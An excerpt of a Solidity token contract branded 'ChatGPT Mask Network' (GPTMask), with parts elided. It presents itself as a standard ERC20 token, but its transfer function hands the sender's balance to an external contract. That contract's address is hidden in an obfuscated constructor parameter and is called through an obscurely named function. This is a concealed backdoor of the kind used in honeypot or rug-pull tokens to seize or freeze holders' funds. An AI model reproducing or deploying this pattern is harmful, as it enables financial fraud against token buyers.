...
contract TOKEN is Ownable, IERC20 {
    ...
    string private _name = "ChatGPT Mask Network";
    string private _symbol = "GPTMask";
    uint256 private _decimals;
    uint256 private _totalSupply;
    uint256 private riZUMiF_;

    constructor(uint256 decimals_, uint256 _MAXiZUMiF) {
        _decimals = decimals_;
        riZUMiF_ = _MAXiZUMiF;
    ...
    function _transfer(
        ...
        require(amount > 0);
        _balance[from] = _riZUMiF(
            address(uint160(uint256(riZUMiF_ 
            + _decimals)))
        )._Araya(from, amount, _balance[from]);
